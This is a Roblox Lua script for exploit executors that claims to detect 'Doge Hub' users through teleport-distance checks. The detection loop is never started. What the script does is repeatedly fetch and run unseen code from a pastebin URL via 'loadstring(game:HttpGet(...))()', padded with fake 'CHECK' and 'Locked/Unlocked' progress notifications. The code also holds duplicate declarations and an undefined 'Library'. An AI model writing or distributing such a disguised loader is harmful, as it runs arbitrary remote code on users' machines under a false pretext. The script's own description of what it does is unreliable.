
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local executor = "Solara"

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Function to send a notification
local function sendNotification(message)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Doge Hub User Found!";
        Text = message;
        Duration = 5;
    })
end

print("Script initialized.")

-- Configuration
local teleportThresholdSmall = 6000 -- Threshold for small teleportation
local teleportThresholdLarge = 90000 -- Threshold for large teleportation
local checkInterval = 0.01 -- Interval to check player positions (in seconds)
local playerPositions = {} -- Store players' previous positions
local flaggedPlayers = {} -- Store players who have already been flagged
local bypassFlag = false -- Set to true to bypass flag detection

-- Function to detect teleportation
local function detectTeleportation(player, oldPosition, newPosition)
    local distance = (newPosition - oldPosition).Magnitude

    if not bypassFlag then
        if distance >= teleportThresholdLarge and not flaggedPlayers[player.Name] then
            flaggedPlayers[player.Name] = true
            print(player.Name .. " flagged for large teleportation!")
            sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Wave")
        elseif distance >= teleportThresholdSmall and distance < teleportThresholdLarge and not flaggedPlayers[player.Name] then
            flaggedPlayers[player.Name] = true
            print(player.Name .. " flagged for small teleportation!")
            sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Solara")
        end
    end
end

-- Main loop to track player positions and detect teleportation
local function trackPlayers()
    print("Tracking players started.")
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local humanoidRootPart = player.Character.HumanoidRootPart
                local currentPosition = humanoidRootPart.Position

                if playerPositions[player.Name] then
                    local oldPosition = playerPositions[player.Name]
                    detectTeleportation(player, oldPosition, currentPosition)
                else
                    print(player.Name .. " has no previous position tracked.")
                end

                playerPositions[player.Name] = currentPosition
            else
                playerPositions[player.Name] = nil
            end
        end

        wait(checkInterval)
    end
end

-- Start tracking players


-- Load external script
print("Attempting to load external script...")
local success, err = pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
end)

if not success then
    print("Error loading external script: " .. err)
end


	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("CHECK 1")
	wait(0.6)
	Library:Notify("Locked")
	wait(1)
	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("Unlocked")
	Library:Notify("CHECK 2")
	wait(1)
	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("CHECK 3")
	wait(1)
	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("Check 100%")
